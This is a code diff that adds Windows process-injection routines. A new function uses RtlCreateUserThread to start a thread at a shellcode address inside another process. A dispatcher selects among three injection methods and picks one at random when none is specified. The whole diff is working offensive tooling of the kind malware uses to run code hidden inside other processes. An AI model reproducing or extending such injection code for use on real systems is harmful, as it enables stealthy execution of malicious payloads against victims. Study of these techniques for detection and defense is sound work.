@@ -36,3 +36,46 @@ bool run_shellcode_in_new_thread2(HANDLE hProcess, LPVOID remote_shellcode_ptr)
     ResumeThread(hMyThread); //injected code
     return true;
 }
+
+bool run_shellcode_in_new_thread3(HANDLE hProcess, LPVOID remote_shellcode_ptr)
+{
+    NTSTATUS status = NULL;
+    HANDLE hMyThread = NULL;
+    CLIENT_ID cid;
+    //create a new thread for the injected code:
+    
+    if ((status = RtlCreateUserThread(hProcess, NULL, false, 0, 0, 0, remote_shellcode_ptr, NULL, &hMyThread, &cid)) != STATUS_SUCCESS)
+    {
+        printf("[ERROR] RtlCreateUserThread failed, status : %x\n", status);
+        return false;
+    }
+    printf("Created Thread, id = %x\n", GetThreadId(hMyThread));
+    printf("Resuming added thread...\n");
+    ResumeThread(hMyThread); //injected code
+    return true;
+}
+
+//---
+bool run_shellcode_in_new_thread(HANDLE hProcess, LPVOID remote_shellcode_ptr, DWORD method = 0)
+{
+    bool isSuccess = false;
+    const SIZE_T method_max = 3;
+    DWORD random = (GetTickCount() * 1000) % method_max + 1;
+    if (method > method_max || method < 1) method = random;
+
+    printf("Injecting by method, id = %x\n", method);
+    switch (method) {
+    case 1:
+        isSuccess = run_shellcode_in_new_thread1(hProcess, remote_shellcode_ptr);
+        break;
+    case 2:
+        isSuccess = run_shellcode_in_new_thread2(hProcess, remote_shellcode_ptr);
+        break;
+    case 3:
+        isSuccess = run_shellcode_in_new_thread3(hProcess, remote_shellcode_ptr);
+        break;
+    default:
+        return false;
+    }
+    return isSuccess;
+}
